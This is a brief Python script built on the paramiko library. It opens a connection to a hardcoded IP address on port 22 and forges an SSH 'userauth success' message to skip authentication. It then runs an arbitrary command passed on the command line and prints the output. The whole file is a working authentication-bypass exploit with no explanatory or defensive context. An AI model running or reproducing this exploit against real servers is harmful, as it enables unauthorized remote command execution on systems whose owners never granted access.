import sys
import paramiko
import socket

s = socket.socket()
s.connect(("5.196.149.88",22))
m = paramiko.message.Message()
t = paramiko.transport.Transport(s)
t.start_client()
m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(m)
c = t.open_session(timeout=5)
c.exec_command(sys.argv[1])
out = c.makefile("rb",2048)
output =out.read()
out.close()
print(output)